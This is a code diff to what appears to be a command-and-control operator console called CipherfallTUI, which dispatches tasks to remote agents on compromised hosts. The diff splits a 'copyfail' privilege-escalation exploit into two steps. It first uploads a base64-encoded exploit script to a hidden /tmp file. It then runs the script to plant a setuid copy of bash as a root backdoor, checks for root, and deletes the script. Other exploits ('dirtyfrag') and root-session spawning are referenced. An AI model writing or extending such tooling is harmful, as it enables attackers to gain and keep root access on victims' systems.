@@ -647,8 +647,6 @@ def _build_privesc_payload(exploit: str, tag: str) -> "str | None":
         if not src.exists():
             return None
         script = src.read_text()
-        # Backdoor must run INSIDE python3 (fd still open = page cache patch active).
-        # Trailing \n in the printf format string makes /bin/sh read the piped commands.
         inner_cmd = (
             "g.system(\"printf 'cp /bin/bash " + bd + "; chmod +s " + bd + ";"
             " echo [privesc:ok] copyfail; id\\n' | /bin/su 2>/dev/null"
@@ -657,13 +655,8 @@ def _build_privesc_payload(exploit: str, tag: str) -> "str | None":
         )
         patched = script.replace('g.system("su")', inner_cmd)
         b64 = base64.b64encode(patched.encode()).decode()
-        return (
-            f"BD={bd}; T=/tmp/.{tag}cf.py; "
-            f"printf '%s' '{b64}' | base64 -d > $T; "
-            f"python3 $T 2>&1; "
-            f"if [ -u \"$BD\" ]; then $BD -p -c 'id'; "
-            f"else echo '[privesc:fail] copyfail'; fi; rm -f $T"
-        )
+        rpath = f"/tmp/.{tag}cf.py"
+        return f"WRITE:{rpath}:{b64}"
     if exploit == "dirtyfrag":
         src = _PRIVESC_DIR / "dirtyfrag" / "exp"
         if not src.exists():
@@ -704,6 +697,14 @@ def _build_privesc_payload(exploit: str, tag: str) -> "str | None":
             f"rm -f $T"
         )
     return None
+
+
+def _build_copyfail_exec(bd: str, rpath: str) -> str:
+    return (
+        f"BD={bd}; python3 {rpath} 2>&1; rm -f {rpath}; "
+        f"if [ -u \"$BD\" ]; then $BD -p -c 'id'; "
+        f"else echo '[privesc:fail] copyfail'; fi"
+    )
 
 
 def _build_privesc_auto(tag: str) -> "str | None":
@@ -1363,6 +1364,35 @@ class CipherfallTUI(App):
         px = self._privesc_tasks.get(task_id)
         if px is not None:
             out = task.get("output") or ""
+            if px.get("type") == "privesc_write":
+                if "written" in out:
+                    rp       = px["remote_path"]
+                    bd       = f"/tmp/.b{px['tag']}"
+                    aid      = px["agent_id"]
+                    bu       = self._agent_base.get(aid, BASE)
+                    exec_cmd = _build_copyfail_exec(bd, rp)
+                    log.write("[yellow]upload done — launching copyfail…[/yellow]")
+                    try:
+                        async with httpx.AsyncClient() as c:
+                            r2 = await c.post(f"{bu}/admin/task",
+                                              json={"agent_id": aid, "command": exec_cmd},
+                                              timeout=3)
+                            res = r2.json()
+                        self._privesc_tasks[res["task_id"]] = {
+                            "type":     "privesc_exec",
+                            "exploit":  px["exploit"],
+                            "agent_id": aid,
+                            "tag":      px["tag"],
+                        }
+                        self._selected_task = res["task_id"]
+                        await self._load_tasks(aid)
+                    except Exception as e:
+                        log.write(f"[red]exec dispatch error: {e}[/red]")
+                elif out:
+                    log.write(f"[red]upload error: {out[:200]}[/red]")
+                else:
+                    log.write("[dim]uploading copyfail…[/dim]")
+                return
             if out:
                 log.write_raw(out.strip())
                 if "[privesc:ok]" in out and task_id not in self._root_spawned:
@@ -1374,7 +1404,7 @@ class CipherfallTUI(App):
                 elif "[privesc:fail] all" in out:
                     log.write("[red]all exploits failed — target likely patched[/red]")
             else:
-                log.write(f"[dim]running {px['exploit']} exploit…[/dim]")
+                log.write(f"[dim]running {px.get('exploit', '?')} exploit…[/dim]")
             return
 
         dl = self._download_tasks.get(task_id)
@@ -1753,7 +1783,11 @@ class CipherfallTUI(App):
             except Exception as e:
                 log.write(f"[red]dispatch error: {e}[/red]")
                 return
-            self._privesc_tasks[result["task_id"]] = {"exploit": exploit, "agent_id": agent_id, "tag": tag}
+            px_entry: dict = {"exploit": exploit, "agent_id": agent_id, "tag": tag}
+            if exploit == "copyfail":
+                px_entry["type"]        = "privesc_write"
+                px_entry["remote_path"] = f"/tmp/.{tag}cf.py"
+            self._privesc_tasks[result["task_id"]] = px_entry
             self._selected_task = result["task_id"]
             log.clear()
             log.write(f"[yellow]privesc ({exploit}) dispatched — tag {tag}[/yellow]")
